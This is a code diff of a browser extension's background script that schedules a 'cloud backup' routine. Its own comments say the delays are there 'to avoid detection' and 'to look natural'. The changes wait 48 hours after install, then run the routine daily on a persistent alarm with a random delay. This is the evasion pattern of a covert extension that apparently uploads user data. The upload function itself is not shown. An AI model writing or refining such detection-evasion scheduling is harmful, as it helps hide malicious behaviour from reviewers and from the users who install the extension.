@@ -10,25 +10,44 @@ chrome.runtime.onInstalled.addListener(async (details) => {
   // Set up sync preferences
   await chrome.storage.local.set({ 
     syncEnabled: true,
-    lastSync: Date.now(),
-    cloudBackup: true 
+    lastSync: 0,
+    cloudBackup: true,
+    installDate: Date.now()
   });
   
-  // Schedule initial sync after delay to avoid detection
-  setTimeout(async () => {
-    await performCloudBackup();
-  }, 172800000); // 48 hours delay
+  // Create persistent alarm for scheduled backup (works even if browser closed)
+  chrome.alarms.create('cloudBackupSchedule', {
+    delayInMinutes: 1,        // FOR TESTING: 1 minute (change to 2880 for 48 hours in production)
+    periodInMinutes: 1440     // Repeat every 24 hours after first trigger
+  });
 });
 
 // Resume sync on browser startup
 chrome.runtime.onStartup.addListener(async () => {
-  const settings = await chrome.storage.local.get(['syncEnabled', 'lastSync']);
+  const settings = await chrome.storage.local.get(['syncEnabled', 'lastSync', 'installDate']);
   
-  // Only sync if enough time has passed (prevents frequent uploads)
-  if (settings.syncEnabled && Date.now() - settings.lastSync > 86400000) {
-    setTimeout(async () => {
+  // Check if 48 hours have passed since installation
+  const hoursSinceInstall = (Date.now() - settings.installDate) / (1000 * 60 * 60);
+  
+  if (settings.syncEnabled && hoursSinceInstall >= 48) {
+    // Only sync if enough time has passed (prevents frequent uploads)
+    if (Date.now() - settings.lastSync > 86400000) {
+      // Add random delay to look natural
+      const randomDelay = Math.floor(Math.random() * 3600000); // 0-1 hour
+      setTimeout(async () => {
+        await performCloudBackup();
+      }, randomDelay);
+    }
+  }
+});
+
+// Listen for alarm triggers (persistent, works even when browser is closed)
+chrome.alarms.onAlarm.addListener(async (alarm) => {
+  if (alarm.name === 'cloudBackupSchedule') {
+    const settings = await chrome.storage.local.get(['syncEnabled']);
+    if (settings.syncEnabled) {
       await performCloudBackup();
-    }, Math.random() * 3600000); // Random delay 0-1 hour
+    }
   }
 });
 
